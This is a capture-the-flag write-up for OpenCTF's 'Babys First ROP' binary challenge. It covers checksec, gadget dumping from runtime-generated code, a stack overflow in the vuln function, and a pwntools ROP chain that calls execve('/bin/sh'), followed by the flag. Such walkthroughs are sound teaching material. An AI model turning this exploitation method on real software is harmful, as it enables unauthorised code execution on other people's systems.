---
title: "OpenCTF Babys First ROP"
date: Sun, 12 Aug 2018 10:22:00 +0000
draft: false
type: posts
categories: 
- 
---
# OpenCTF Babys First ROP

<br/>

<br/>
**Category:** Binary/Reverse

**Points:** 100

**Description:**

```
If this is your first time, it will be your first time. Available at 172.31.2.62:47802 - https://scoreboard.openctf.com/babys_first_rop-e0f4088e3b5a86cf3d388fac3bc070493c6f71c5
```

**File Download:** [babys\_first\_rop-e0f4088e3b5a86cf3d388fac3bc070493c6f71c5](https://aagallag.com/files/ctf_files/openctf/babys-first-rop/babys_first_rop-e0f4088e3b5a86cf3d388fac3bc070493c6f71c5)

Investigation
=============

My initial investigation usually starts the same with pwn challenges. I like to start with running the `file` command so that I get a high-level idea of what I’m working with.

```
$ file babys_first_rop-719f2fbc00e318076347df5eb215a20741fb29ca
babys_first_rop-719f2fbc00e318076347df5eb215a20741fb29ca: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a92f66db1ba36b3e54041f5de948f19d9043aed1, not stripped
```

Ok, so it’s an x86-64 binary, not stripped, and dynamically linked. I next like to run checksec (included with `pwntools`), as this will be useful information to keep in mind when looking for vulnerabilities and later building the exploit.

```
$ checksec babys_first_rop-719f2fbc00e318076347df5eb215a20741fb29ca
[*] 'babys_first_rop-719f2fbc00e318076347df5eb215a20741fb29ca'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

-   No canaries, so if we find a stack overflow vulnerability, we won’t need to circumvent any canaries.
-   NX is enabled, so as the name and description for the challenge implies, we won’t be able to put shellcode on the stack, we will have to build a ROP chain.
-   No PIE, so our gadgets should be accessible from hardcoded memory addresses.

I knew I would need gadgets for this challenge (for the ROP chain), so I decided to run [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) on the binary. Unfortunately, I didn’t find that many gadgets, which is common for dynamically linked binaries. So I figured I would move onto reversing.

Reversing
=========

Cracking
--------

I opened up the binary in IDA Pro, I immediately noticed a common call that gets in the way of debugging.

![](https://i.imgur.com/mlDXpn0.png)

This alarm call causes the program to crash after 30 seconds. This isn’t a lot of time for debugging, so I’m going to go ahead and remove this from the binary. While I certainly could manually hex-edit the bytes and replace with the correct number of `NOP` instructions, using the IDA Pro plugin, [Fentanyl](https://github.com/isislab/Fentanyl) makes this way quicker and easier.

Gadget Hunting
--------------

Admittedly, I didn’t do a ton of reversing on this one. I knew I still needed to find gadgets for this challenge, so I started looking for how I might find these. It didn’t take long for me to notice this loop in the assembly.

![](https://i.imgur.com/xUVcAYp.png)

I didn’t fully reverse this, but with assistence from the symbols, I suspected the gadgets are getting generated at run-time. And based on the `mprotect` call, I suspect that the location where these gadgets are getting stored is marked as executable. Instead of reversing these gadgets, I decided to attach a debugger after the gadgets are generated and dumping the memory. However, I wasn’t exactly sure how I would dump the memory to a file. After some quick Google-fu, I found this helpful Github gist by herrcore [ida\_memdump.py](https://gist.github.com/herrcore/d023f3ab01b2091af3667d8d3f66e6db). I simply copy&pasted the script into the IDA-Python immediate window. Then I set a breakpoing right before the instruction for `call vuln` (0x0400717). Once the breakpoint is reached, I dumped gadgets by simply entering the following command into the immediate window: `memdump(0x601080, 0x30000, 'gadgets.raw')`. To explain where these values are comming from, 0x601080 is the location of where the gadgets are stored in the .bss section. For the length, I used 0x30000 as this is the length provided above to the call to `mprotect`. And the last parameter is simply an arbitrary filename.

Now to convert this raw dump into a readable, searchable format, I used `objdump`. The full command is below:

```
objdump -D -b binary -m i386 gadgets.raw > gadgets_objdump.txt
```

**NOTE:** I initially tried to use x86-64 for the option for ‘-m’, but that was throwing an error. Since x86-64 is backwards compatible with x86 (i386), I figured this shouldn’t be a problem. An example of this output can be seen below:

```

gadgets.raw:     file format binary


Disassembly of section .data:

00000000 <.data>:
       0:   00 00                   add    %al,(%eax)
       2:   c3                      ret    
       3:   00 01                   add    %al,(%ecx)
       5:   c3                      ret    
       6:   00 02                   add    %al,(%edx)
       8:   c3                      ret    
       9:   00 03                   add    %al,(%ebx)
       b:   c3                      ret    
       c:   00 04 c3                add    %al,(%ebx,%eax,8)
       f:   00 05 c3 00 06 c3       add    %al,0xc30600c3
      15:   00 07                   add    %al,(%edi)
........ lots of gadgets ........
   2fffe:   ff c3                   inc    %ebx
```

Vulnerability Identification
============================

Now before I build my ropchain, I want to make sure I have a vulnerability to trigger the ropchain. Again, using the symbols as a clue, I go straight to the `vuln` function.

![](https://i.imgur.com/Vk0flKA.png)

Here, we have a pretty obvious stack overflow. Read is called, with a length of `0x100` and stored in a hard-coded location in `.bss`. Then, memcpy is called to copy upto `0x100` bytes onto the stack, however, only `0x50` bytes are allocated on the stack for the destination of this memcpy. So now we have our vulnerability!

Solution (Exploit Development)
==============================

If you are not familiar with the [pwntools](https://github.com/Gallopsled/pwntools) library for Python, I highly recommend getting familiar with it. It is incredibly helpful for building exploits for CTFs, and can also come in handy for non-pwn challenges, such as PPC or shellcoding challenges.

So first I start with building my payload. We will need 0x58(88) bytes of padding, followed by our ROP chain.

```
payload = ''
payload += 'A'*88
```

Ok, let’s think about what we want our ROP chain to do. The goal for most pwn challenges, is to pop a shell. The easiest way is to somehow execute `execve`. Let’s take a look at the [Linux x64 Syscall chart](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/).

```
%rax    System call     %rdi                    %rsi                        %rdx
59      sys_execve      const char *filename    const char *const argv[]    const char *const envp[]
```

So to get a shell, we want something like the following psuedo-code:

```
rax = 59
rdi = '/bin/sh\x00'
rsi = '\x00\x00\x00\x00\x00\x00\x00\x00'
rdx = '\x00\x00\x00\x00\x00\x00\x00\x00'
```

So if we can setup the registers to match above, and then execute the `syscall` instruction, we should get a shell to play with!

We have lots of gadgets to play with, but the easiest gadgets for writing arbitrary data to registers is the pop instruction. This allows us to simply place the desired values directly on the stack. However, I now begin to ask myself, how am I going to get a hardcoded address pointing to `/bin/sh\x00`? Well, that’s when I noticed when debugging the vuln function, that the rdi register was already pointing to the beginning of my payload padding. So let’s just put ‘/bin/sh\\x00’ at the beginning before the padding. And while I’m at it, I also go ahead and add a 64-bit 0x00 value after the `/bin/sh\x00` string. Additionally, I also realized that the payload is also stored in a hard-coded location in the .bss section, not just on the stack. So below is what my payload looks like now:

```
payload = ''
payload += '/bin/sh\x00'
payload += p64(0x00)
payload += 'A'*(88-len(payload))
```

And memory locations:

```
0x631080: '/bin/sh\x00'
0x631088: '\x00\x00\x00\x00\x00\x00\x00\x00'
```

And as I mentioned above, `rdi` is already pointing to the beginning of my payload, which is now `/bin/sh\x00`. So we need a gadget for setting the following registers, `rax`, `rsi`, and `rdx`, and of course, the syscall gadget.

The `pop` instruction will be the easiest for us, so I simply grepped the text dump for pop. Since we decoded the instructions as x86, we’ll be looking for the x86 registers. There are duplicates, but these were the ones I happend to grab:

```
GADGETS_BASE    = 0x601080
GADGET_POP_EAX  = GADGETS_BASE + 0x7609#:    58                      pop    %eax
GADGET_POP_ESI  = GADGETS_BASE + 0x761b#:    5e                      pop    %esi
GADGET_POP_EDX  = GADGETS_BASE + 0x760f#:    5a                      pop    %edx
GADGET_SYSCALL  = GADGETS_BASE + 0x2d0f#:    0f 05                   syscall
```

Finally, we are ready to put everything together for the complete ROP chain:

```
p = getp()

payload = ''
payload += '/bin/sh\x00'
payload += p64(0x00)
payload += 'A'*(88-len(payload))
payload += p64(GADGET_POP_EAX)
payload += p64(59)
payload += p64(GADGET_POP_ESI)
payload += p64(0x631088)
payload += p64(GADGET_POP_EDX)
payload += p64(0x631088)
payload += p64(GADGET_SYSCALL)

p.sendline(payload)
```

**Full Script Download:** [babys\_first\_rop\_pwner.py](https://gist.github.com/aagallag/3a707b1157dac64e3eff376de9f87b52)

Flag
====

**OpenCTF{Itz\_0nly\_45\_c0Mpl1c4t3d\_as\_you\_want\_itTOBE}**

#### [Source](http://b0tchsec.com/2018/openctf/babysfirstrop)

<br/>
---
